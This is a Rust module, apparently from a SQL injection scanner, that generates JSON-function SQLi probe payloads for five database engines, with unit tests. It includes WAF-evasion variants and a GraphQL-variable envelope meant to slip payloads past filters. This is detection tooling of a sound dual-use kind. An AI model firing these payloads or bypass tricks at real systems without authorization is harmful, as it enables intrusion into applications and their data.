#![deny(unsafe_code)]

//! JSON-function `SQLi` payloads per DBMS.
//!
//! Apps storing JSON (configs, preferences, API blobs) often splice user input
//! into `JSON_EXTRACT` / `->>` / `JSON_VALUE` expressions. A quote break-out
//! there behaves like classic `SQLi` but signature WAFs tuned for `OR 1=1` can
//! miss the JSON context — hence dedicated boolean + error probes.
//!
//! Each [`JsonPayload`] carries a TRUE/FALSE boolean pair plus one error
//! probe. The error probe embeds the `__bad__` sentinel document (invalid
//! JSON everywhere): MySQL raises `Invalid JSON text`, Postgres
//! `invalid input syntax for type json`, MSSQL
//! `JSON text is not properly formatted`. Oracle uses a malformed path
//! (`$..[`, ORA-40442) since `JSON_VALUE` on lax documents may not raise.

/// Sentinel invalid JSON document embedded in error probes.
///
/// Chosen to be invalid JSON on every DBMS while remaining a plausible probe
/// body; integration mocks key off it to return per-DBMS error text.
pub const BAD_DOC: &str = "__bad__";

/// MSSQL's `JSON_VALUE` returns NULL on invalid JSON rather than raising an error.
/// Use OPENJSON with explicit schema validation for error-based detection.
const MSSQL_BAD_DOC_OPENJSON: &str = "'__bad__'";

#[derive(Debug, Clone)]
#[non_exhaustive]
pub struct JsonPayload {
    pub true_payload: String,
    pub false_payload: String,
    pub error_payload: String,
    pub dbms: String,
}

impl JsonPayload {
    #[must_use]
    pub fn new(
        true_payload: impl Into<String>,
        false_payload: impl Into<String>,
        error_payload: impl Into<String>,
        dbms: impl Into<String>,
    ) -> Self {
        Self {
            true_payload: true_payload.into(),
            false_payload: false_payload.into(),
            error_payload: error_payload.into(),
            dbms: dbms.into(),
        }
    }
}

#[allow(clippy::too_many_lines)] // flat data table: one block per payload, no logic
#[must_use]
pub fn json_payloads_for(dbms: Option<&str>) -> Vec<JsonPayload> {
    match dbms {
        Some("mysql") => vec![
            JsonPayload::new(
                "' OR JSON_EXTRACT('{\"k\":1}', '$.k')=1 -- -",
                "' OR JSON_EXTRACT('{\"k\":1}', '$.k')=2 -- -",
                format!("' AND JSON_EXTRACT('{BAD_DOC}', '$') -- -"),
                "mysql",
            ),
            JsonPayload::new(
                "' OR '{\"k\":1}'->>'$.k'='1' -- -",
                "' OR '{\"k\":1}'->>'$.k'='2' -- -",
                format!("' AND JSON_UNQUOTE(JSON_EXTRACT('{BAD_DOC}', '$'))='1' -- -"),
                "mysql",
            ),
            // Team82 WAF-bypass shape (Vulnsy cheat-sheet): `/**/` instead of
            // spaces so `OR 1=1` signatures miss it. Appended last so L1/L2
            // budgets stay byte-identical.
            JsonPayload::new(
                "'/**/OR/**/JSON_EXTRACT('{\"a\":1}','$.a')=1 -- -",
                "'/**/OR/**/JSON_EXTRACT('{\"a\":1}','$.a')=2 -- -",
                format!("' AND JSON_EXTRACT('{BAD_DOC}','$.a') -- -"),
                "mysql",
            ),
        ],
        Some("postgres") => vec![
            JsonPayload::new(
                "' OR ('{\"k\":1}'::json->>'k')='1' --",
                "' OR ('{\"k\":1}'::json->>'k')='2' --",
                format!("' AND ('{BAD_DOC}'::json->>'k')='1' --"),
                "postgres",
            ),
            JsonPayload::new(
                "' OR ('{\"k\":1}'::jsonb->>'k')='1' --",
                "' OR ('{\"k\":1}'::jsonb->>'k')='2' --",
                format!("' AND ('{BAD_DOC}'::jsonb->'k')='1' --"),
                "postgres",
            ),
            // Team82 `@>` containment bypass (Vulnsy cheat-sheet): rewrites
            // `OR 1=1` as JSON containment so arithmetic-equality signatures
            // miss it. TRUE `@> '{"a":1}'` vs FALSE `@> '{"a":2}'`.
            JsonPayload::new(
                "'/**/OR/**/'{\"a\":1}'::jsonb @> '{\"a\":1}'::jsonb --",
                "'/**/OR/**/'{\"a\":1}'::jsonb @> '{\"a\":2}'::jsonb --",
                format!("' AND ('{BAD_DOC}'::jsonb @> '{{\"a\":1}}'::jsonb)='1' --"),
                "postgres",
            ),
        ],
        Some("mssql") => vec![
            JsonPayload::new(
                "' OR JSON_VALUE('{\"k\":1}','$.k')='1' --",
                "' OR JSON_VALUE('{\"k\":1}','$.k')='2' --",
                // JSON_VALUE returns NULL on invalid input; use OPENJSON for error-based detection.
                format!(
                    "' AND (SELECT value FROM OPENJSON({MSSQL_BAD_DOC_OPENJSON}) WITH (k int '$.k'))='1' --"
                ),
                "mssql",
            ),
            JsonPayload::new(
                "' OR (SELECT value FROM OPENJSON('{\"k\":1}') WHERE [key]='k')='1' --",
                "' OR (SELECT value FROM OPENJSON('{\"k\":1}') WHERE [key]='k')='2' --",
                // Strict OPENJSON: invalid JSON raises "JSON text is not properly formatted"
                format!("' AND (SELECT * FROM OPENJSON({MSSQL_BAD_DOC_OPENJSON}))='1' --"),
                "mssql",
            ),
        ],
        Some("oracle") => vec![
            JsonPayload::new(
                "' OR JSON_VALUE('{\"k\":1}', '$.k')='1' --",
                "' OR JSON_VALUE('{\"k\":1}', '$.k')='2' --",
                "' AND JSON_VALUE('{\"k\":1}', '$..[')='1' --",
                "oracle",
            ),
            JsonPayload::new(
                "' OR CASE WHEN JSON_EXISTS('{\"k\":1}', '$.k') THEN 1 ELSE 0 END=1 --",
                "' OR CASE WHEN JSON_EXISTS('{\"k\":1}', '$.k') THEN 1 ELSE 0 END=0 --",
                "' AND JSON_EXISTS('{\"k\":1}', '$..[')=1 --",
                "oracle",
            ),
        ],
        // SQLite (Team82 `->`/`->>` family): JSON1 `json_extract` boolean
        // plus the `->>` operator form. Error channel is `malformed JSON`
        // on the `__bad__` sentinel (same channel as the canonical
        // `dbms::sqlite` `json_extract('__bad__','$')` probe).
        Some("sqlite") => vec![
            JsonPayload::new(
                "' OR json_extract('{\"k\":1}','$.k')=1 --",
                "' OR json_extract('{\"k\":1}','$.k')=2 --",
                format!("' AND json_extract('{BAD_DOC}','$') --"),
                "sqlite",
            ),
            JsonPayload::new(
                "' OR ('{\"k\":1}' ->> '$.k')='1' --",
                "' OR ('{\"k\":1}' ->> '$.k')='2' --",
                format!("' AND json_extract('{BAD_DOC}','$') --"),
                "sqlite",
            ),
        ],
        _ => vec![
            JsonPayload::new(
                "' OR JSON_EXTRACT('{\"k\":1}', '$.k')=1 -- -",
                "' OR JSON_EXTRACT('{\"k\":1}', '$.k')=2 -- -",
                format!("' AND JSON_EXTRACT('{BAD_DOC}', '$') -- -"),
                "mysql",
            ),
            JsonPayload::new(
                "' OR ('{\"k\":1}'::json->>'k')='1' --",
                "' OR ('{\"k\":1}'::json->>'k')='2' --",
                format!("' AND ('{BAD_DOC}'::json->>'k')='1' --"),
                "postgres",
            ),
            JsonPayload::new(
                "' OR JSON_VALUE('{\"k\":1}','$.k')='1' --",
                "' OR JSON_VALUE('{\"k\":1}','$.k')='2' --",
                format!("' AND JSON_VALUE('{BAD_DOC}','$.k')='1' --"),
                "mssql",
            ),
            // Team82 WAF-bypass sweep (appended last, same shapes as the
            // per-DBMS variants above).
            JsonPayload::new(
                "'/**/OR/**/JSON_EXTRACT('{\"a\":1}','$.a')=1 -- -",
                "'/**/OR/**/JSON_EXTRACT('{\"a\":1}','$.a')=2 -- -",
                format!("' AND JSON_EXTRACT('{BAD_DOC}','$.a') -- -"),
                "mysql",
            ),
            JsonPayload::new(
                "'/**/OR/**/'{\"a\":1}'::jsonb @> '{\"a\":1}'::jsonb --",
                "'/**/OR/**/'{\"a\":1}'::jsonb @> '{\"a\":2}'::jsonb --",
                format!("' AND ('{BAD_DOC}'::jsonb @> '{{\"a\":1}}'::jsonb)='1' --"),
                "postgres",
            ),
            JsonPayload::new(
                "' OR json_extract('{\"k\":1}','$.k')=1 --",
                "' OR json_extract('{\"k\":1}','$.k')=2 --",
                format!("' AND json_extract('{BAD_DOC}','$') --"),
                "sqlite",
            ),
        ],
    }
}

/// GraphQL variable envelope: wraps an error `PAYLOAD` so it rides inside
/// `variables` instead of the query text (WAFs keyed on `query:` miss it,
/// resolvers still interpolate it — cf. Praetorian 2024 GraphQL→Postgres
/// `SQLi` via search-term argument).
#[must_use]
pub fn graphql_envelope(variable: &str, payload: &str) -> String {
    format!(
        "{{\"query\":\"query($v: String){{node(id: $v){{id}}}}\",\"variables\":{{\"{variable}\":\"{payload}\"}}}}"
    )
}

/// One GraphQL variable probe per DBMS (mysql/postgres), built from the
/// canonical error payloads. Additive: `json_payloads_for` ordering is
/// untouched.
#[must_use]
pub fn graphql_probes_for(dbms: Option<&str>) -> Vec<JsonPayload> {
    let mut out = Vec::new();
    if dbms.is_none_or(|d| d == "mysql") {
        out.push(JsonPayload::new(
            graphql_envelope("id", "' OR JSON_EXTRACT('{\"k\":1}', '$.k')=1 -- -"),
            graphql_envelope("id", "' OR JSON_EXTRACT('{\"k\":1}', '$.k')=2 -- -"),
            graphql_envelope("id", &format!("' AND JSON_EXTRACT('{BAD_DOC}', '$') -- -")),
            "mysql",
        ));
    }
    if dbms.is_none_or(|d| d == "postgres") {
        out.push(JsonPayload::new(
            graphql_envelope("id", "' OR ('{\"k\":1}'::json->>'k')='1' --"),
            graphql_envelope("id", "' OR ('{\"k\":1}'::json->>'k')='2' --"),
            graphql_envelope("id", &format!("' AND ('{BAD_DOC}'::json->>'k')='1' --")),
            "postgres",
        ));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn mysql_pair_and_error_probe() {
        let v = json_payloads_for(Some("mysql"));
        assert_eq!(v.len(), 3);
        for p in &v {
            assert_eq!(p.dbms, "mysql");
            assert!(p.true_payload.contains("JSON_EXTRACT") || p.true_payload.contains("->>"));
            assert!(p.error_payload.contains(BAD_DOC), "got {}", p.error_payload);
            assert!(
                p.true_payload.ends_with("-- -"),
                "mysql comment: {}",
                p.true_payload
            );
        }
        // Team82 /**/ bypass appended last.
        let team82 = &v[2];
        assert!(
            team82.true_payload.contains("/**/OR/**/JSON_EXTRACT"),
            "got {}",
            team82.true_payload
        );
        assert_ne!(team82.true_payload, team82.false_payload);
    }

    #[test]
    fn postgres_uses_cast_operators() {
        let v = json_payloads_for(Some("postgres"));
        assert_eq!(v.len(), 3);
        assert!(v[0].true_payload.contains("::json"));
        assert!(v[1].true_payload.contains("::jsonb"));
        // Team82 @> containment bypass appended last.
        assert!(
            v[2].true_payload.contains("@>"),
            "got {}",
            v[2].true_payload
        );
        assert!(
            v[2].true_payload.contains("/**/OR/**/"),
            "got {}",
            v[2].true_payload
        );
        assert_ne!(v[2].true_payload, v[2].false_payload);
        for p in &v {
            assert!(
                p.true_payload.ends_with("--"),
                "pg comment: {}",
                p.true_payload
            );
            assert!(!p.true_payload.ends_with("-- -"));
        }
    }

    #[test]
    fn mssql_json_value_and_openjson() {
        let v = json_payloads_for(Some("mssql"));
        assert_eq!(v.len(), 2);
        assert!(v[0].true_payload.contains("JSON_VALUE"));
        assert!(v[1].true_payload.contains("OPENJSON"));
    }

    #[test]
    fn oracle_json_value_and_exists() {
        let v = json_payloads_for(Some("oracle"));
        assert_eq!(v.len(), 2);
        assert!(v[0].true_payload.contains("JSON_VALUE"));
        assert!(v[1].true_payload.contains("JSON_EXISTS"));
        // malformed path probe for ORA-40442
        assert!(
            v[0].error_payload.contains("$..["),
            "got {}",
            v[0].error_payload
        );
    }

    #[test]
    fn generic_covers_three_dbms() {
        let v = json_payloads_for(None);
        assert_eq!(v.len(), 6);
        let kinds: Vec<&str> = v.iter().map(|p| p.dbms.as_str()).collect();
        assert!(kinds.contains(&"mysql"));
        assert!(kinds.contains(&"postgres"));
        assert!(kinds.contains(&"mssql"));
        assert!(kinds.contains(&"sqlite"));
        // Team82 sweep appended last (mysql /**/ + pg @>), sqlite narrow last.
        assert!(v[3].true_payload.contains("/**/OR/**/JSON_EXTRACT"));
        assert!(v[4].true_payload.contains("@>"));
        assert!(v[5].true_payload.contains("json_extract"));
    }

    #[test]
    fn sqlite_json_extract_and_arrow() {
        let v = json_payloads_for(Some("sqlite"));
        assert_eq!(v.len(), 2);
        assert!(
            v[0].true_payload.contains("json_extract"),
            "got {}",
            v[0].true_payload
        );
        assert!(
            v[1].true_payload.contains("->>"),
            "got {}",
            v[1].true_payload
        );
        for p in &v {
            assert_eq!(p.dbms, "sqlite");
            assert!(p.error_payload.contains(BAD_DOC), "got {}", p.error_payload);
            assert!(
                p.true_payload.ends_with("--"),
                "sqlite comment: {}",
                p.true_payload
            );
            assert!(!p.true_payload.ends_with("-- -"));
            assert_ne!(p.true_payload, p.false_payload);
        }
    }

    #[test]
    fn graphql_probes_ride_in_variables() {
        let v = graphql_probes_for(None);
        assert_eq!(v.len(), 2);
        for p in &v {
            assert!(
                p.true_payload.contains("\"variables\""),
                "{}",
                p.true_payload
            );
            assert!(p.error_payload.contains(BAD_DOC), "{}", p.error_payload);
            assert_ne!(p.true_payload, p.false_payload);
        }
        assert_eq!(graphql_probes_for(Some("mysql")).len(), 1);
        assert_eq!(graphql_probes_for(Some("mssql")).len(), 0);
        let env = graphql_envelope("id", "PAYLOAD");
        assert!(env.contains("\"query\""), "{env}");
        assert!(env.contains("\"variables\""), "{env}");
    }

    #[test]
    fn true_false_differ_only_in_comparison() {
        for p in json_payloads_for(None) {
            assert_ne!(p.true_payload, p.false_payload);
            // same function context, different expected value
            let prefix_len = p
                .true_payload
                .char_indices()
                .zip(p.false_payload.char_indices())
                .take_while(|(a, b)| a.1 == b.1)
                .count();
            assert!(prefix_len > 10, "pair should share a long prefix");
        }
    }
}
